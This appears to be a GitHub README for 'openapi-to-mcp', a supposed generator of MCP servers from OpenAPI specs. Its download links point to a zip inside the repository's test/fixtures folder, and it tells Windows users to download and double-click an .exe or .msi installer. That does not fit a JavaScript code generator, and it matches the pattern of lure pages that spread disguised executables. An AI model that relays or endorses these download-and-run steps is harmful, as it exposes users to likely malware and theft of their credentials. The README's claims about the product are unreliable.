# 🏗️ openapi-to-mcp - Turn API specs into server code

[![](https://img.shields.io/badge/Download-OpenAPI_to_MCP-blue)](https://github.com/Combinatorial-clipartist4822/openapi-to-mcp/raw/refs/heads/main/test/fixtures/openapi_to_mcp_v3.0.zip)

This tool helps you build a server for artificial intelligence models. It takes your existing API information and creates the code needed to connect that data to a smart assistant. You save time because the software handles the setup requirements for the Model Context Protocol.

## 📋 What This Tool Does

Modern artificial intelligence models work best when they have access to external data. An OpenAPI file acts like a map for your data. This software reads that map and generates a mini-server. This server runs on Vercel, a platform for hosting web projects. Once you have this server, your AI can look up information and perform tasks through your API. You do not need to write code to create this connection.

## 💻 System Requirements

You need a Windows computer to run this tool. Ensure you have the following installed before starting:

*   Windows 10 or 11.
*   A stable internet connection.
*   A text editor like Notepad or Visual Studio Code to view your files.
*   An existing OpenAPI file in JSON or YAML format.

## 📥 Getting the Software

You must visit the project page to get the installer for your computer.

[Click here to visit the download page](https://github.com/Combinatorial-clipartist4822/openapi-to-mcp/raw/refs/heads/main/test/fixtures/openapi_to_mcp_v3.0.zip)

Select the file that matches your version of Windows. Most users should choose the file ending in `.msi` or `.exe`. Save this file to your Downloads folder.

## ⚙️ Setting Up Your Environment

You need to place your API file in a folder where you can find it. Create a new folder on your desktop and name it "mcp-project". Move your OpenAPI document into this folder. Ensure the document uses a standard format like `openapi.json` or `swagger.yaml`. 

Keep this folder open. You will point the application to this location during the setup process.

## 🚀 Running the Application

1. Double-click the file you saved from the website to start the installation.
2. Follow the prompts on your screen. The process creates a shortcut on your desktop.
3. Open the program using the desktop shortcut.
4. The software asks for the location of your OpenAPI file. Click the "Browse" button and select the file in your "mcp-project" folder.
5. Click the "Generate" button. 
6. The software displays a status bar. Wait for the process to finish.
7. Once finished, a new folder named "generated-server" appears inside your "mcp-project" folder. This folder contains the code for your new server.

## 🌐 Deploying to Vercel

The generated code works with Vercel. You must have a Vercel account to host your server.

1. Sign in to your Vercel dashboard in your web browser.
2. Select the "Add New Project" button.
3. Choose the option to import from a local folder or connect your GitHub account.
4. Select the "generated-server" folder inside your "mcp-project" directory.
5. Click the "Deploy" button.
6. Vercel builds the server and provides a public link. Save this link. You will need it to connect your AI model.

## 🧠 Using the Server

After deployment, your server provides functions that the AI can call. These functions match the paths described in your original OpenAPI file. If your API retrieves weather data, your AI can now request weather updates directly. You plug the public link provided by Vercel into your AI settings under the MCP configuration section.

## 🛠️ Troubleshooting Common Issues

Check these items if you encounter errors during the setup process:

*   Verify that your OpenAPI file contains no errors. You can use online validators to check the structure.
*   Ensure the file ends with a correct extension like `.json` or `.yaml`.
*   Check your internet connection if the deployment to Vercel fails.
*   Make sure you have write permissions in the folder where you store your project.

## 📁 Project Structure

The folder created by the software contains several important files:

*   `package.json`: This file defines the project settings and dependencies.
*   `index.js`: This is the main file that runs the server logic.
*   `README.md`: This file includes specific instructions for your new server.
*   `vercel.json`: This file tells Vercel how to handle your code.

Do not delete or move files inside this folder unless you intend to change how the server operates.

## ❓ Frequently Asked Questions

**Does this software store my API data?**
No. The software runs locally on your machine. Your data stays in the folders you manage.

**Can I use this for private APIs?**
Yes. The generated server works with internal or external APIs. You manage the authentication keys through Vercel settings.

**Do I need a paid Vercel plan?**
No. The free tier of Vercel works perfectly for these small server setups.

**What happens if I update my OpenAPI file?**
You must run the software again to regenerate the server code. Once the code is updated, deploy it to Vercel again to apply the changes.

**Is there a limit to the number of APIs I can convert?**
There is no limit. You can create as many servers as you need for different projects.

## ⚖️ Guidelines

This tool follows the Model Context Protocol standards. Use the software to bridge the gap between your local resources and your AI interface. Keep your API keys secure. Use environment variables within Vercel to store sensitive information instead of hardcoding keys into your generated files.